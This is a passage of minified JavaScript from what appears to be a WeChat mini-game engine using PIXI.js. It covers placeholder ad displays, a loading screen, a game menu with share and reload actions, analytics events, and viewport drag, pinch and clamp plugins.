            i.beginFill(0), i.drawRect(0, 0, this.app.gameWidth, this.app.gameHeight), i.endFill(),
                i.x = -this.app.gameWidth / 2, i.y = -this.app.gameHeight / 2 * 1.5, i.width = 1.5 * this.app.gameWidth,
                i.height = 1.5 * this.app.gameHeight, i.alpha = .8, i.interactive = !0, this.info.addChild(i),
                (i = new PIXI__namespace.Text("这是模拟广告，真实广告请发布到独立小游戏体验", {
                    align: "center",
                    fill: "#ffffff",
                    fontSize: 16 * this.PixelRatio
                })).anchor.set(.5), i.x = 0, i.y = i.height / 2, this.info.addChild(i), (i = new PIXI__namespace.Sprite.from("https://wximg.qq.com/wxgame/luban/static/close.png")).width = 40 * this.PixelRatio,
                i.height = 40 * this.PixelRatio, i.x = -i.width / 2, i.y = .6 * this.app.gameHeight / 2,
                i.interactive = !0, this.info.addChild(i), i.on("pointerdown", function () {
                    e.removeInfo(), t && eventEmitter.emit(OPCODE.eventAdEnd);
                });
        }
    }]), e;
}(), BannerWidth$1 = 340, BannerHeight$1 = 86, BannerAd = function () {
    function e(t) {
        classCallCheck(this, e);
        try {
            this.PixelRatio = wxSystemInfo.pixelRatio;
        } catch (t) {
            this.PixelRatio = 2;
        }
        this.app = t, this.banner = new PIXI__namespace.Container(), this.banner.visible = !1,
            this.banner.name = "banner Ad", this.width = BannerWidth$1 * this.PixelRatio, this.height = BannerHeight$1 * this.PixelRatio,
            this.banner.x = -this.width / 2, this.banner.y = this.app.gameHeight / 2 / this.app.stage.scale.x - this.height,
            this.app.stage.addChild(this.banner), this.init();
    }
    return createClass(e, [{
        key: "init",
        value: function () {
            var t = new PIXI__namespace.Graphics();
            t.beginFill(15169845), t.drawRect(0, 0, this.width, this.height), t.endFill(), t.width = this.width,
                t.height = this.height, t.alpha = .8, this.banner.addChild(t), (t = new PIXI__namespace.Text("Banner广告逐步下线，请替换为原生广告", {
                    align: "center",
                    fill: "#ffffff",
                    fontSize: 16 * this.PixelRatio
                })).x = this.width / 2 - t.width / 2, t.y = this.height / 2 - t.height / 2, this.banner.addChild(t);
        }
    }, {
        key: "show",
        value: function (t) {
            var e = !(1 < arguments.length && void 0 !== arguments[1]) || arguments[1];
            switch (t) {
                case "_left_":
                    this.banner.x = -this.app.gameWidth / 2;
                    break;

                case "_right_":
                    this.banner.x = this.app.gameWidth / 2 - this.width;
                    break;

                default:
                    this.banner.x = -this.width / 2;
            }
            this.banner.visible = e;
        }
    }]), e;
}(), BannerWidth = 350, BannerHeight = 106, NativeAd = function () {
    function e(t) {
        classCallCheck(this, e);
        try {
            this.PixelRatio = wxSystemInfo.pixelRatio;
        } catch (t) {
            this.PixelRatio = 2;
        }
        this.app = t, this.banner = new PIXI__namespace.Container(), this.banner.visible = !1,
            this.banner.name = "native Ad", this.width = BannerWidth * this.PixelRatio, this.height = BannerHeight * this.PixelRatio,
            this.banner.x = -this.width / 2, this.banner.y = this.app.gameHeight / 2 / this.app.stage.scale.x - this.height,
            this.app.stage.addChild(this.banner), this.init();
    }
    return createClass(e, [{
        key: "init",
        value: function () {
            var t = new PIXI__namespace.Graphics();
            t.beginFill(15169845), t.drawRect(0, 0, this.width, this.height), t.endFill(), t.width = this.width,
                t.height = this.height, t.alpha = .8, this.banner.addChild(t), (t = new PIXI__namespace.Text("请发布后体验广告效果", {
                    align: "center",
                    fill: "#ffffff",
                    fontSize: 16 * this.PixelRatio
                })).x = this.width / 2 - t.width / 2, t.y = this.height / 2 - t.height / 2, this.banner.addChild(t);
        }
    }, {
        key: "show",
        value: function (t, e) {
            var i = !(2 < arguments.length && void 0 !== arguments[2]) || arguments[2];
            t = LB.Util.toNumber(t) * this.PixelRatio, e = -1 * LB.Util.toNumber(e) * this.PixelRatio,
                console.log("native AD show:" + t + "," + e), this.banner.x = t, this.banner.y = e,
                this.banner.visible = i;
        }
    }]), e;
}(), dpr$1 = getDeviceInfo().devicePixelRatio, Loading = function () {
    function i(t) {
        classCallCheck(this, i);
        var e = getDeviceInfo();
        this.PixelRatio = e.devicePixelRatio, this.loadingContainer = new PIXI__namespace.Container(),
            this.app = t, this.loadingContainer.scale.set(t.stage.scale.x, t.stage.scale.y),
            this.loadingContainer.pivot.set(t.stage.pivot.x, t.stage.pivot.y), this.timer = null,
            this.image = isMiniGame ? PIXI__namespace.Texture.from("img/loading.png") : PIXI__namespace.Texture.from(require("@/assets/game/loading.png")),
            this.initBackground(), this.initText(), t._Container.addChild(this.loadingContainer),
            isMiniGame && (this.loadingContainer.visible = !1);
    }
    return createClass(i, [{
        key: "initBackground",
        value: function () {
            var t = new PIXI__namespace.Sprite(this.image);
            t.x = 0, t.y = 0, t.width = 200 * dpr$1, t.height = 112 * dpr$1, t.anchor.set(.5),
                this.loadingContainer.addChild(t);
        }
    }, {
        key: "initText",
        value: function () {
            var t = new PIXI__namespace.Text();
            t.text = "资源加载中...", t.anchor.set(.5), t.x = 0, t.y = 50, t.style = new PIXI__namespace.TextStyle({
                fontFamily: "Arial",
                fontSize: 14 * this.PixelRatio,
                fontStyle: "",
                fill: 16777215,
                align: "center",
                wordWrap: !1
            }), this.textLabel = t, this.loadingContainer.addChild(t);
        }
    }, {
        key: "setText",
        value: function (t) {
            this.textLabel && (this.textLabel.text = t);
        }
    }, {
        key: "show",
        value: function () {
            var t = this;
            this.app.runtimeData.config.meta.defaultLoading ? this.timer = setTimeout(function () {
                t.loadingContainer.visible = !0;
            }, 100) : this.loadingContainer.visible = !1;
        }
    }, {
        key: "hide",
        value: function () {
            clearTimeout(this.timer), this.loadingContainer.visible = !1;
        }
    }]), i;
}(), GameReport = {
    box_game_back: function (t) {
        mta && mta.Event.stat("box_game_back", {
            gameid: t
        });
    },
    box_game_exit: function (t) {
        mta && mta.Event.stat("box_game_exit", {
            gameid: t
        });
    },
    box_game_reload: function (t) {
        mta && mta.Event.stat("box_game_reload", {
            gameid: t
        });
    },
    box_game_share: function (t) {
        mta && mta.Event.stat("box_game_share", {
            gameid: t
        });
    },
    box_game_cancel: function (t) {
        mta && mta.Event.stat("box_game_cancel", {
            gameid: t
        });
    }
}, dpr = getDeviceInfo().devicePixelRatio, MenuBtn = function () {
    function e(t) {
        classCallCheck(this, e), this.app = t, "lbMTZkMmZlNjMtZjFmYy00MzU5LWE4OTgtNjQzYzY3YzhhNjUz" !== GameGlobal.open_game_info.game_id && (this.init(),
            this.initPosition());
    }
    return createClass(e, [{
        key: "init",
        value: function () {
            var t, e, i, n, s, r, a, o, l, h = this, u = GameGlobal.isPublic ? new PIXI__namespace.Texture.from("img/minigame/back_dark.png") : new PIXI__namespace.Texture.from("img/menu.png");
            this.menu = new PIXI__namespace.Sprite(u), GameGlobal.isPublic ? this.menu.width = 44 * dpr : this.menu.width = 32 * dpr,
                this.menu.height = 32 * dpr, this.menu.visible = !1, this.menu.interactive = !0,
                this.app._Container.addChild(this.menu), this.menu.on("pointerup", this.click.bind(this)),
                GameGlobal.isPublic && (u = wxSystemInfo.screenWidth * wxSystemInfo.pixelRatio,
                    t = wxSystemInfo.screenHeight * wxSystemInfo.pixelRatio, e = wxSystemInfo.screenWidth / 375 * wxSystemInfo.pixelRatio,
                    this.publicMenu = new PIXI__namespace.Container(), this.app._Container.addChild(this.publicMenu),
                    (i = new PIXI__namespace.Graphics().beginFill(0, .6).drawRect(0, 0, u, t).endFill()).cacheAsBitmap = !0,
                    i.interactive = !0, i.on("pointerup", function () {
                        h.publicMenu.visible = !1, h.app.eventEmitter.emit("game_start"), GameReport.box_game_cancel(GameGlobal.game_id);
                    }), n = new PIXI__namespace.Container(), (s = new PIXI__namespace.Graphics().beginFill(16777215, 1).drawRoundedRect(0, 0, 320 * e, 240 * e, 8 * e).endFill()).cacheAsBitmap = !0,
                    s.interactive = !0, r = new PIXI__namespace.TextStyle({
                        align: "left",
                        fontFamily: "Microsoft YaHei",
                        fontSize: 20 * e,
                        fill: 0,
                        breakWords: !1,
                        wordWrap: !1
                    }), (r = new PIXI__namespace.Text(GameGlobal.open_game_info.project_name, r)).position.set(s.width / 2 - r.width / 2, 32 * e),
                    r.alpha = .9, r.texture.baseTexture.scaleMode = 1, a = new PIXI__namespace.Sprite.from("img/minigame/game_icon_exit.png", {
                        scaleMode: 1
                    }), o = new PIXI__namespace.Sprite.from("img/minigame/game_icon_reload.png", {
                        scaleMode: 1
                    }), l = new PIXI__namespace.Sprite.from("img/minigame/game_icon_share.png", {
                        scaleMode: 1
                    }), a.width = o.width = l.width = 64 * e, a.height = o.height = l.height = 92 * e,
                    a.position.set(32 * e, 86 * e), o.position.set(128 * e, 86 * e), l.position.set(224 * e, 86 * e),
                    a.interactive = !0, a.on("pointerup", function () {
                        GameGlobal.GameApp.renderDetail(GameGlobal.game_id), GameReport.box_game_exit(GameGlobal.game_id);
                    }), o.interactive = !0, o.on("pointerup", function () {
                        h.publicMenu.visible = !1, h.app.vm.reset(), GameReport.box_game_reload(GameGlobal.game_id);
                    }), l.interactive = !0, l.on("pointerup", function () {
                        wx.shareAppMessage({
                            title: GameGlobal.open_game_info.share_title || GameGlobal.open_game_info.project_name || "来玩个小游戏吧",
                            imageUrl: GameGlobal.open_game_info.public_share_image_url || GameGlobal.open_game_info.screenshot || "https://res.wx.qq.com/wechatgame/product/webpack/userupload/20200929/104614/share.jpg",
                            query: "game_id=" + GameGlobal.open_game_info.game_id
                        }), GameReport.box_game_share(GameGlobal.game_id);
                    }), n.addChild(s, r, a, o, l), n.position.set(u / 2 - s.width / 2, t / 2 - s.height / 2),
                    this.publicMenu.addChild(i, n), this.publicMenu.visible = !1);
        }
    }, {
        key: "click",
        value: function () {
            GameGlobal.isPublish || (GameGlobal.isPublic ? wxSystemInfo.windowWidth > wxSystemInfo.windowHeight ? GameGlobal.detail && wx.navigateBackMiniProgram ? wx.navigateBackMiniProgram({
                extraData: {
                    game_id: GameGlobal.game_id
                },
                success: function () {
                    wx.exitMiniProgram && wx.exitMiniProgram({});
                }
            }) : wx.navigateToMiniProgram && wx.navigateToMiniProgram({
                appId: "wx722e01aaedff584c",
                path: "?game_id=" + GameGlobal.game_id,
                extraData: {
                    game_id: GameGlobal.game_id
                },
                envVersion: "trial",
                success: function () {
                    wx.exitMiniProgram && wx.exitMiniProgram({});
                },
                fail: function () { }
            }) : (this.app.eventEmitter.emit("game_pause"), this.publicMenu.visible = !0, GameReport.box_game_back(GameGlobal.game_id)) : this.app.ui.gameInfo.isInfoShowing || !this.menu.visible || this.app.subContext.friendRankShow || (this.app.ui.gameInfo.renderInfo(null, function () { }, function () { }, "pause"),
                mta && mta.Event.stat("home_click_menu", {})));
        }
    }, {
        key: "show",
        value: function () { }
    }, {
        key: "hide",
        value: function () { }
    }, {
        key: "initPosition",
        value: function () {
            var t = this;
            if (this.__cacheMenuBtnInfo) this.setPosition(this.__cacheMenuBtnInfo); else {
                var i = void 0;
                try {
                    i = wx.getMenuButtonBoundingClientRect();
                } catch (t) {
                    i = {};
                }
                this.setPosition(i), setTimeout(function () {
                    try {
                        i = wx.getMenuButtonBoundingClientRect();
                    } catch (t) {
                        i = {};
                    }
                    var e;
                    i.left ? t.setPosition(i) : (e = void 0, setTimeout(function () {
                        try {
                            e = wx.getMenuButtonBoundingClientRect();
                        } catch (t) {
                            e = {};
                        }
                        e.left || (e = {
                            top: 10,
                            left: wxSystemInfo.windowWidth - 87 - 10,
                            right: wxSystemInfo.windowWidth - 10
                        }), t.setPosition(e);
                    }, 2e3));
                }, 1e3);
            }
        }
    }, {
        key: "setPosition",
        value: function (t) {
            t && t.right && this.menu && ((this.__cacheMenuBtnInfo = t).top || ("android" === res.platform ? t.top = 8 : t.top = 10),
                this.menu) && this.menu.parent && (this.menu.visible = !0, this.menu.x = (t.right - t.width) * dpr - this.menu.width - 10 * dpr,
                    this.menu.y = t.top * dpr, GameGlobal.isPublic ? this.menu.x = 8 * dpr : this.menu.x = (t.right - t.width) * dpr - this.menu.width - 10 * dpr,
                    this.menu.y = t.top * dpr);
        }
    }, {
        key: "destroy",
        value: function () {
            this.app._Container.removeChild(this.menu), this.publicMenu && this.publicMenu.destroy({
                children: !0
            }), this.menu.off("pointerup", this.click.bind(this)), this.menu.destroy(), this.menu = null;
        }
    }]), e;
}(), Dialog = function () {
    function e(t) {
        classCallCheck(this, e), this.app = t;
    }
    return createClass(e, [{
        key: "show",
        value: function (t) {
            this.dialog || (this.dialog = this.app.runtimeData.currentScene.renderer.addSprite({
                id: "global_dialog",
                visible: !0,
                name: "global_dialog",
                width: 652,
                height: 253,
                type: "text",
                rotation: 0,
                scale: {
                    x: 1,
                    y: 1
                },
                theme: [{
                    id: "1_132ae245069e4f25a36e91cdc91f1ad8",
                    url: "https://gamemaker.qpic.cn/luban/1_132ae245069e4f25a36e91cdc91f1ad8"
                }],
                align: 1,
                currentStyleId: "",
                styles: ["defaultText"],
                textureMap: {},
                x: 0,
                y: -500,
                gameWidth: 750,
                gameHeight: 1334,
                origin: "bFD8}~;VDWYx)6}Qb2w{",
                verticalAlign: 1,
                fontFamily: "Microsoft YaHei",
                fontSize: 26,
                fontWeight: "normal",
                fillColor: {
                    alpha: 1,
                    hex: "#000000",
                    rgba: "rgba(0,0,0,1)"
                },
                backgroundColor: {
                    alpha: 1,
                    hex: "#FFFFFF",
                    rgba: "rgba(255,255,255,1)"
                },
                text: "默认文字",
                padding: [10, 10, 10, 10],
                pivot: {
                    x: 0,
                    y: 0
                },
                mirror: 0,
                lineHeight: 1.5,
                repeat: 1
            })), this.dialog.setText(t);
        }
    }, {
        key: "hide",
        value: function () {
            this.dialog.visible = !1;
        }
    }]), e;
}(), PLUGIN_ORDER = ["drag", "pinch", "wheel", "follow", "mouse-edges", "decelerate", "bounce", "snap-zoom", "clamp-zoom", "snap", "clamp"], PluginManager$1 = function () {
    function e(t) {
        classCallCheck(this, e), this.viewport = t, this.list = [], this.plugins = {};
    }
    return createClass(e, [{
        key: "add",
        value: function (t, e) {
            var i = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : PLUGIN_ORDER.length, e = (this.plugins[t] = e,
                PLUGIN_ORDER.indexOf(t));
            -1 !== e && PLUGIN_ORDER.splice(e, 1), PLUGIN_ORDER.splice(i, 0, t), this.sort();
        }
    }, {
        key: "get",
        value: function (t) {
            return this.plugins[t];
        }
    }, {
        key: "update",
        value: function (t) {
            var e = !0, i = !1, n = void 0;
            try {
                for (var s, r = this.list[Symbol.iterator](); !(e = (s = r.next()).done); e = !0) s.value.update(t);
            } catch (t) {
                i = !0, n = t;
            } finally {
                try {
                    !e && r.return && r.return();
                } finally {
                    if (i) throw n;
                }
            }
        }
    }, {
        key: "resize",
        value: function () {
            var t = !0, e = !1, i = void 0;
            try {
                for (var n, s = this.list[Symbol.iterator](); !(t = (n = s.next()).done); t = !0) n.value.resize();
            } catch (t) {
                e = !0, i = t;
            } finally {
                try {
                    !t && s.return && s.return();
                } finally {
                    if (e) throw i;
                }
            }
        }
    }, {
        key: "reset",
        value: function () {
            var t = !0, e = !1, i = void 0;
            try {
                for (var n, s = this.list[Symbol.iterator](); !(t = (n = s.next()).done); t = !0) n.value.reset();
            } catch (t) {
                e = !0, i = t;
            } finally {
                try {
                    !t && s.return && s.return();
                } finally {
                    if (e) throw i;
                }
            }
        }
    }, {
        key: "remove",
        value: function (t) {
            this.plugins[t] && (this.plugins[t] = null, this.viewport.emit(t + "-remove"), this.sort());
        }
    }, {
        key: "pause",
        value: function (t) {
            this.plugins[t] && this.plugins[t].pause();
        }
    }, {
        key: "resume",
        value: function (t) {
            this.plugins[t] && this.plugins[t].resume();
        }
    }, {
        key: "sort",
        value: function () {
            var t = !0, e = !(this.list = []), i = void 0;
            try {
                for (var n, s = PLUGIN_ORDER[Symbol.iterator](); !(t = (n = s.next()).done); t = !0) {
                    var r = n.value;
                    this.plugins[r] && this.list.push(this.plugins[r]);
                }
            } catch (t) {
                e = !0, i = t;
            } finally {
                try {
                    !t && s.return && s.return();
                } finally {
                    if (e) throw i;
                }
            }
        }
    }, {
        key: "down",
        value: function (t) {
            var e = !1, i = !0, n = !1, s = void 0;
            try {
                for (var r, a = this.list[Symbol.iterator](); !(i = (r = a.next()).done); i = !0) r.value.down(t) && (e = !0);
            } catch (t) {
                n = !0, s = t;
            } finally {
                try {
                    !i && a.return && a.return();
                } finally {
                    if (n) throw s;
                }
            }
            return e;
        }
    }, {
        key: "move",
        value: function (t) {
            var e = !1, i = !0, n = !1, s = void 0;
            try {
                for (var r, a = this.viewport.plugins.list[Symbol.iterator](); !(i = (r = a.next()).done); i = !0) r.value.move(t) && (e = !0);
            } catch (t) {
                n = !0, s = t;
            } finally {
                try {
                    !i && a.return && a.return();
                } finally {
                    if (n) throw s;
                }
            }
            return e;
        }
    }, {
        key: "up",
        value: function (t) {
            var e = !1, i = !0, n = !1, s = void 0;
            try {
                for (var r, a = this.list[Symbol.iterator](); !(i = (r = a.next()).done); i = !0) r.value.up(t) && (e = !0);
            } catch (t) {
                n = !0, s = t;
            } finally {
                try {
                    !i && a.return && a.return();
                } finally {
                    if (n) throw s;
                }
            }
            return e;
        }
    }, {
        key: "wheel",
        value: function (t) {
            var e = !1, i = !0, n = !1, s = void 0;
            try {
                for (var r, a = this.list[Symbol.iterator](); !(i = (r = a.next()).done); i = !0) r.value.wheel(t) && (e = !0);
            } catch (t) {
                n = !0, s = t;
            } finally {
                try {
                    !i && a.return && a.return();
                } finally {
                    if (n) throw s;
                }
            }
            return e;
        }
    }]), e;
}(), Plugin = function () {
    function e(t) {
        classCallCheck(this, e), this.parent = t, this.paused = !1;
    }
    return createClass(e, [{
        key: "destroy",
        value: function () { }
    }, {
        key: "down",
        value: function () {
            return !1;
        }
    }, {
        key: "move",
        value: function () {
            return !1;
        }
    }, {
        key: "up",
        value: function () {
            return !1;
        }
    }, {
        key: "wheel",
        value: function () {
            return !1;
        }
    }, {
        key: "update",
        value: function () { }
    }, {
        key: "resize",
        value: function () { }
    }, {
        key: "reset",
        value: function () { }
    }, {
        key: "pause",
        value: function () {
            this.paused = !0;
        }
    }, {
        key: "resume",
        value: function () {
            this.paused = !1;
        }
    }]), e;
}(), dragOptions = {
    direction: "all",
    pressDrag: !0,
    wheel: !0,
    wheelScroll: 1,
    reverse: !1,
    clampWheel: !1,
    underflow: "center",
    factor: 1,
    mouseButtons: "all",
    keyToPress: null,
    ignoreKeyToPressOnTouch: !1
}, Drag = function () {
    function i(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}, t = (classCallCheck(this, i),
            possibleConstructorReturn(this, (i.__proto__ || Object.getPrototypeOf(i)).call(this, t)));
        return t.options = Object.assign({}, dragOptions, e), t.moved = !1, t.reverse = t.options.reverse ? 1 : -1,
            t.xDirection = !t.options.direction || "all" === t.options.direction || "x" === t.options.direction,
            t.yDirection = !t.options.direction || "all" === t.options.direction || "y" === t.options.direction,
            t.keyIsPressed = !1, t.parseUnderflow(), t.mouseButtons(t.options.mouseButtons),
            t.options.keyToPress && t.handleKeyPresses(t.options.keyToPress), t;
    }
    return inherits(i, Plugin), createClass(i, [{
        key: "handleKeyPresses",
        value: function (e) {
            var i = this;
            parent.addEventListener("keydown", function (t) {
                e.includes(t.code) && (i.keyIsPressed = !0);
            }), parent.addEventListener("keyup", function (t) {
                e.includes(t.code) && (i.keyIsPressed = !1);
            });
        }
    }, {
        key: "mouseButtons",
        value: function (t) {
            this.mouse = t && "all" !== t ? [-1 !== t.indexOf("left"), -1 !== t.indexOf("middle"), -1 !== t.indexOf("right")] : [!0, !0, !0];
        }
    }, {
        key: "parseUnderflow",
        value: function () {
            var t = this.options.underflow.toLowerCase();
            "center" === t ? (this.underflowX = 0, this.underflowY = 0) : (this.underflowX = -1 !== t.indexOf("left") ? -1 : -1 !== t.indexOf("right") ? 1 : 0,
                this.underflowY = -1 !== t.indexOf("top") ? -1 : -1 !== t.indexOf("bottom") ? 1 : 0);
        }
    }, {
        key: "checkButtons",
        value: function (t) {
            var e = "mouse" === t.data.pointerType, i = this.parent.input.count();
            return !(!(1 === i || 1 < i && !this.parent.plugins.get("pinch")) || e && !this.mouse[t.data.button]);
        }
    }, {
        key: "checkKeyPress",
        value: function (t) {
            return !!(!this.options.keyToPress || this.keyIsPressed || this.options.ignoreKeyToPressOnTouch && "touch" === t.data.pointerType);
        }
    }, {
        key: "down",
        value: function (t) {
            if (!this.paused && this.options.pressDrag) return this.checkButtons(t) && this.checkKeyPress(t) ? (this.last = {
                x: t.data.global.x,
                y: t.data.global.y
            }, this.current = t.data.pointerId, !0) : void (this.last = null);
        }
    }, {
        key: "move",
        value: function (t) {
            if (!this.paused && this.options.pressDrag && this.last && this.current === t.data.pointerId) {
                var e = t.data.global.x, i = t.data.global.y;
                if (1 === (n = this.parent.input.count()) || 1 < n && !this.parent.plugins.get("pinch")) {
                    var n = e - this.last.x, s = i - this.last.y;
                    if (this.moved || this.xDirection && this.parent.input.checkThreshold(n) || this.yDirection && this.parent.input.checkThreshold(s)) return n = {
                        x: e,
                        y: i
                    }, this.xDirection && (this.parent.x += (n.x - this.last.x) * this.options.factor),
                        this.yDirection && (this.parent.y += (n.y - this.last.y) * this.options.factor),
                        this.last = n, this.moved || this.parent.emit("drag-start", {
                            event: t,
                            screen: new PIXI$1.Point(this.last.x, this.last.y),
                            world: this.parent.toWorld(new PIXI$1.Point(this.last.x, this.last.y)),
                            viewport: this.parent
                        }), this.moved = !0, this.parent.emit("moved", {
                            viewport: this.parent,
                            type: "drag"
                        }), !0;
                } else this.moved = !1;
            }
        }
    }, {
        key: "up",
        value: function (t) {
            var e;
            if (!this.paused) return 1 === (e = this.parent.input.touches).length ? ((e = e[0]).last && (this.last = {
                x: e.last.x,
                y: e.last.y
            }, this.current = e.id), !(this.moved = !1)) : this.last && this.moved ? (e = new PIXI$1.Point(this.last.x, this.last.y),
                this.parent.emit("drag-end", {
                    event: t,
                    screen: e,
                    world: this.parent.toWorld(e),
                    viewport: this.parent
                }), this.last = null, !(this.moved = !1)) : void 0;
        }
    }, {
        key: "wheel",
        value: function (t) {
            if (!this.paused && this.options.wheel && !this.parent.plugins.get("wheel")) return this.xDirection && (this.parent.x += t.deltaX * this.options.wheelScroll * this.reverse),
                this.yDirection && (this.parent.y += t.deltaY * this.options.wheelScroll * this.reverse),
                this.options.clampWheel && this.clamp(), this.parent.emit("wheel-scroll", this.parent),
                this.parent.emit("moved", {
                    viewport: this.parent,
                    type: "wheel"
                }), this.parent.options.passiveWheel || t.preventDefault(), !0;
        }
    }, {
        key: "resume",
        value: function () {
            this.last = null, this.paused = !1;
        }
    }, {
        key: "clamp",
        value: function () {
            var t = this.parent.plugins.get("decelerate") || {};
            if ("y" !== this.options.clampWheel) if (this.parent.screenWorldWidth < this.parent.screenWidth) switch (this.underflowX) {
                case -1:
                    this.parent.x = 0;
                    break;

                case 1:
                    this.parent.x = this.parent.screenWidth - this.parent.screenWorldWidth;
                    break;

                default:
                    this.parent.x = (this.parent.screenWidth - this.parent.screenWorldWidth) / 2;
            } else this.parent.left < 0 ? (this.parent.x = 0, t.x = 0) : this.parent.right > this.parent.worldWidth && (this.parent.x = -this.parent.worldWidth * this.parent.scale.x + this.parent.screenWidth,
                t.x = 0);
            if ("x" !== this.options.clampWheel) if (this.parent.screenWorldHeight < this.parent.screenHeight) switch (this.underflowY) {
                case -1:
                    this.parent.y = 0;
                    break;

                case 1:
                    this.parent.y = this.parent.screenHeight - this.parent.screenWorldHeight;
                    break;

                default:
                    this.parent.y = (this.parent.screenHeight - this.parent.screenWorldHeight) / 2;
            } else this.parent.top < 0 && (this.parent.y = 0, t.y = 0), this.parent.bottom > this.parent.worldHeight && (this.parent.y = -this.parent.worldHeight * this.parent.scale.y + this.parent.screenHeight,
                t.y = 0);
        }
    }, {
        key: "active",
        get: function () {
            return this.moved;
        }
    }]), i;
}(), pinchOptions = {
    noDrag: !1,
    percent: 1,
    center: null
}, Pinch = function () {
    function i(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}, t = (classCallCheck(this, i),
            possibleConstructorReturn(this, (i.__proto__ || Object.getPrototypeOf(i)).call(this, t)));
        return t.options = Object.assign({}, pinchOptions, e), t;
    }
    return inherits(i, Plugin), createClass(i, [{
        key: "down",
        value: function () {
            if (2 <= this.parent.input.count()) return this.active = !0;
        }
    }, {
        key: "move",
        value: function (t) {
            var e, i, n, s, r;
            if (!this.paused && this.active) return e = t.data.global.x, i = t.data.global.y,
                2 <= (s = this.parent.input.touches).length ? (r = s[0], s = s[1], n = r.last && s.last ? Math.sqrt(Math.pow(s.last.x - r.last.x, 2) + Math.pow(s.last.y - r.last.y, 2)) : null,
                    r.id === t.data.pointerId ? r.last = {
                        x: e,
                        y: i,
                        data: t.data
                    } : s.id === t.data.pointerId && (s.last = {
                        x: e,
                        y: i,
                        data: t.data
                    }), n ? (e = void 0, i = {
                        x: r.last.x + (s.last.x - r.last.x) / 2,
                        y: r.last.y + (s.last.y - r.last.y) / 2
                    }, this.options.center || (e = this.parent.toLocal(i)), n = (1 - n / (t = 0 === (t = Math.sqrt(Math.pow(s.last.x - r.last.x, 2) + Math.pow(s.last.y - r.last.y, 2))) ? 1e-10 : t)) * this.options.percent * this.parent.scale.x,
                        this.parent.scale.x += n, this.parent.scale.y += n, this.parent.emit("zoomed", {
                            viewport: this.parent,
                            type: "pinch"
                        }), (s = this.parent.plugins.get("clamp-zoom")) && s.clamp(), this.options.center ? this.parent.moveCenter(this.options.center) : (r = this.parent.toGlobal(e),
                            this.parent.x += i.x - r.x, this.parent.y += i.y - r.y, this.parent.emit("moved", {
                                viewport: this.parent,
                                type: "pinch"
                            })), !this.options.noDrag && this.lastCenter && (this.parent.x += i.x - this.lastCenter.x,
                                this.parent.y += i.y - this.lastCenter.y, this.parent.emit("moved", {
                                    viewport: this.parent,
                                    type: "pinch"
                                })), this.lastCenter = i, this.moved = !0) : this.pinching || (this.parent.emit("pinch-start", this.parent),
                                    this.pinching = !0), !0) : void 0;
        }
    }, {
        key: "up",
        value: function () {
            if (this.pinching && this.parent.input.touches.length <= 1) return this.active = !1,
                this.lastCenter = null, this.pinching = !1, this.moved = !1, this.parent.emit("pinch-end", this.parent),
                !0;
        }
    }]), i;
}(), clampOptions = {
    left: !1,
    right: !1,
    top: !1,
    bottom: !1,
    direction: null,
    underflow: "center"
}, Clamp = function () {
    function i(t) {
        var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {}, t = (classCallCheck(this, i),
            possibleConstructorReturn(this, (i.__proto__ || Object.getPrototypeOf(i)).call(this, t)));
        return t.options = Object.assign({}, clampOptions, e), t.options.direction && (t.options.left = "x" === t.options.direction || "all" === t.options.direction || null,
            t.options.right = "x" === t.options.direction || "all" === t.options.direction || null,
            t.options.top = "y" === t.options.direction || "all" === t.options.direction || null,
            t.options.bottom = "y" === t.options.direction || "all" === t.options.direction || null),
            t.parseUnderflow(), t.last = {
                x: null,
                y: null,
                scaleX: null,
                scaleY: null
            }, t.update(), t;
    }
    return inherits(i, Plugin), createClass(i, [{
        key: "parseUnderflow",
        value: function () {
            var t = this.options.underflow.toLowerCase();
            "none" === t ? this.noUnderflow = !0 : ("center" === t ? this.underflowX = this.underflowY = 0 : (this.underflowX = -1 !== t.indexOf("left") ? -1 : -1 !== t.indexOf("right") ? 1 : 0,
                this.underflowY = -1 !== t.indexOf("top") ? -1 : -1 !== t.indexOf("bottom") ? 1 : 0),
                this.noUnderflow = !1);
        }
    }, {
        key: "move",
        value: function () {
            return this.update(), !1;
        }
    }, {
        key: "update",
        value: function () {
            if (!this.paused && (this.parent.x !== this.last.x || this.parent.y !== this.last.y || this.parent.scale.x !== this.last.scaleX || this.parent.scale.y !== this.last.scaleY)) {
                var t = {
                    x: this.parent.x,
                    y: this.parent.y
                }, e = this.parent.plugins.decelerate || {};
                if (null !== this.options.left || null !== this.options.right) {
                    var i = !1;
                    if (this.parent.screenWorldWidth < this.parent.screenWidth) {
                        if (!this.noUnderflow) switch (this.underflowX) {
                            case -1:
                                0 !== this.parent.x && (i = !(this.parent.x = 0));
                                break;

                            case 1:
                                this.parent.x !== this.parent.screenWidth - this.parent.screenWorldWidth && (this.parent.x = this.parent.screenWidth - this.parent.screenWorldWidth,
                                    i = !0);
                                break;

                            default:
                                this.parent.x !== (this.parent.screenWidth - this.parent.screenWorldWidth) / 2 && (this.parent.x = (this.parent.screenWidth - this.parent.screenWorldWidth) / 2,
                                    i = !0);
                        }
                    } else null !== this.options.left && this.parent.left < (!0 === this.options.left ? 0 : this.options.left) && (this.parent.x = -(!0 === this.options.left ? 0 : this.options.left) * this.parent.scale.x,
                        i = !(e.x = 0)), null !== this.options.right && this.parent.right > (!0 === this.options.right ? this.parent.worldWidth : this.options.right) && (this.parent.x = -(!0 === this.options.right ? this.parent.worldWidth : this.options.right) * this.parent.scale.x + this.parent.screenWidth,
                            i = !(e.x = 0));
                    i && this.parent.emit("moved", {
                        viewport: this.parent,
                        original: t,
                        type: "clamp-x"
                    });
                }
                if (null !== this.options.top || null !== this.options.bottom) {
                    var n = !1;
                    if (this.parent.screenWorldHeight < this.parent.screenHeight) {
                        if (!this.noUnderflow) switch (this.underflowY) {
                            case -1:
                                0 !== this.parent.y && (n = !(this.parent.y = 0));
                                break;

                            case 1:
                                this.parent.y !== this.parent.screenHeight - this.parent.screenWorldHeight && (this.parent.y = this.parent.screenHeight - this.parent.screenWorldHeight,
                                    n = !0);
                                break;

                            default:
                                this.parent.y !== (this.parent.screenHeight - this.parent.screenWorldHeight) / 2 && (this.parent.y = (this.parent.screenHeight - this.parent.screenWorldHeight) / 2,
                                    n = !0);
                        }
